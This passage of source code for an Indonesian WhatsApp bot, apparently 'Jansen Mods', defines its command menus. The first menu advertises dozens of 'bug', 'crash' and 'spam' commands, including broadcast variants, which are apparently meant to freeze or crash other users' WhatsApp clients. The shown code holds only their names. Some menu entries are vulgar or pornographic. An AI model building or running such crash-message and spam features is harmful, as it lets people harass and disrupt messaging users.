┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentod [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbokep [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢buginvite [ jumlah ] Pc
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenha [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenhi [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenhu [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenhe [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenba [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbe [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbu [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbi [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenca [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenci [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencu [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenco [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenpoll [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentag [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢inibug [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢hiya [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢lokas [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢catalog [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendocu [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendaca [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢duc [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ducu [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentrol [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentroli [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentroli2 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentroli3 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenjhon2 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenjhon [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbutton [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenkatalog [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenducu [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendaca [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendraknes [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenslebew [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensu [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentol [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenmemek [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencontol [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentextv [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansengas [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenlokas [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenlokas2 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenkangbug [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenkangbug1 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbar [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenoke [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenewe [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenngentod [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug1 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug2 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug3 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug4 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug5 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug6 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug7 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash1 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash2 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash3 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash4 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash5 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash6 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash7 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens1 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens2 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens3 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens4 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens5 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens6 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens7 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens8 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens9 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens10 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens11 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar1 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar2 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar3 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar4 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar5 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar6 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar7 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar8 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar9 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar10 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar11 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar12 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar13 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar14 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar15 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar16 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar17 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar18 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar19 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar20 [ jumlah ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢spam [ Reply Pesan ]
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯BROADCAST✯ ݊⃟̥⃝̇݊⃟•
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bugbctext [ Bug Text Broadcast ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bugbcvideo [ Bug Video Broadcast ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bugbcaudio [ Bug Audio Broadcast ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bugbcimage [ Bug image Broadcast ]
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
*NOTE*
🛡
contact me Wa.me/6281364399250
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ
© ⏤͟͟͞  𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'bot': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": ` © Hay Kak ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
"description": ` - ©✯𝐉𝚫𝐍𝐒𝚵𝐍✯-

◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIH LANJUT ✌️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `©JANSEN WE ARE NOT MASTOD`,
"url": "Wa.me/6281364399250"
},
"businessOwnerJid": "6281364399250@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: m })
jansen.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'soundbot': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ SOUNDBOT MENU ] 
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kal
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ngakak
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ketawa
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢awkwk
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bang
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢nob
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢musik
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢mastah
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢slebew
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cantik
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kesel
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ngeselin
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'funnmenu': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ FUN MENU ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bagaimanakah
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kapankah
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢apakah
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bisakah
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢rate
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wangy
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢gantengcek
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cekganteng
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cantikcek
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cekcantik
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢sangecek
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ceksange
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢gaycek
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cekgay
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢lesbicek
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢halah
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢hilih
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢huluh
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢heleh
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢holoh
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢delttt]
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'primbonmenu': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ PRIMBON MENU ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢nomorhoki
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢artimimpi
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢artinama
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ramaljodoh
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ramaljodohbali
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢suamiistri
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ramalcinta
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cocoknama
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢pasangan
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadiannikah
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢sifatusaha
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢rezeki
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢pekerjaan
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢nasib
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢penyakit
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tarot
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢fengshui
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢haribaik
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢harisangar
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢harisial
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢nagahari
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢arahrezeki
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢peruntungan
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢weton
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢karakter
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢keberuntungan
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢memancing
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢masasubur
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢zodiak
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢shio
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'islamiyah': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ ISLAM MENU ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢hadist
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢alquran
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢juzamma
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tafsirsurah
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'beritanews': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ BERITA MENU ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢merdeka-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kontan-news 
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cnbc-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tribun-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢indozone-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kompas-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢detik-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢daily-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢inews-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢okezone-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢sindo-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tempo-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢antara-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cnn-news
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢fajar-news
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━• `,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'groupmenu': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ GROUP MENU ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢linkgroup
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ephemeral [di group]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setppgc /full [image]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setppbot / full [image]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setname [text]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setdesc [text]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢group [option]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢editinfo [option]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢add @user
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kick @user
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ban [targer]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢hidetag [text]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tagall [text]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢promote @user
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢demote @user
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢mute on / off
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢getname
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢translate
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kalkulator
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢intro
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢getpic
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢penjara
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢intro
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'voicechanger': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ VOICE MENU ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bass
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢blown
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢deep
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢earrape
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢fast
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢fat
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢nightcore
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢reverse
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢robot
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢slow
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tupai
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'asupanmata': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Asupan Mata* 
bokep`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'searchmenu': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ SEARCH MENU ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢gimage [query]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢pinterest [query]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wallpaper [query]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wikimedia [query]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ringtone [query]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢searchgroups [query]
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'scrapconvert': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ SCRAPE CONVERT ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢attp
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ttp
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢toimage
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢sticker
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢emojimix
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢emojimix2
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tovideo
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢togif
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tourl
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tovn
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢toonce
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tomp3
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢toaudio
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ebinary
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢dbinary
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢styletext
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢smeme
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ss [url]
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'cmdmenu': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ CMD MENU ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setcmd
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢listcmd
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢delcmd
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢lockcmd
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
